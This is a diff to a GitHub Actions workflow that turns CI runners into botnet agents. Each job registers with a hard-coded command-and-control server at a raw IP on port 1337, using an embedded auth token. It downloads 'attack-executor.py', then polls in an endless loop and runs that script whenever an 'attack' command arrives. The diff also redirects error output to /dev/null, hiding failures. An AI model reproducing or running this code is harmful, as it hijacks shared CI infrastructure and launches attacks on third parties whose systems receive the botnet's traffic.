@@ -14,13 +14,25 @@ jobs:
       - name: Run
         run: |
           BOT="gh-${{ matrix.slice }}-$(head -c4 /dev/urandom | md5sum | cut -c1-6)"
-          curl -s -X POST http://216.167.26.154:1337/api/register -H "Content-Type: application/json" -d '{"auth":"enibot2024","id":"'"$BOT"'","ip":"0.0.0.0","hostname":"gh","os":"linux","arch":"x86_64","method":"python"}'
+          echo "[+] Bot $BOT"
+
+          curl -s -X POST http://216.167.26.154:1337/api/register \
+            -H "Content-Type: application/json" \
+            -d '{"auth":"enibot2024","id":"'"$BOT"'","ip":"0.0.0.0","hostname":"gh","os":"linux","arch":"x86_64","method":"python"}'
+
           curl -s http://216.167.26.154:1337/attack-executor.py -o /tmp/ex.py
+
           while true; do
-            curl -s -X POST http://216.167.26.154:1337/api/heartbeat -H "Content-Type: application/json" -d '{"id":"'"$BOT"'"}' > /dev/null
-            C=$(curl -s "http://216.167.26.154:1337/api/poll?id=$BOT")
-            if echo "$C" | grep -q attack; then
-              C2_URL=http://216.167.26.154:1337 BOT_ID="$BOT" python3 /tmp/ex.py <<< "$C"
+            curl -s -X POST http://216.167.26.154:1337/api/heartbeat \
+              -H "Content-Type: application/json" \
+              -d '{"id":"'"$BOT"'"}' > /dev/null 2>&1
+
+            C=$(curl -s "http://216.167.26.154:1337/api/poll?id=$BOT" 2>/dev/null)
+
+            if echo "$C" | grep -q '"type":"attack"' 2>/dev/null; then
+              echo "$C" > /tmp/cmds.json
+              C2_URL=http://216.167.26.154:1337 BOT_ID="$BOT" python3 /tmp/ex.py < /tmp/cmds.json 2>/dev/null
             fi
+
             sleep 10
           done
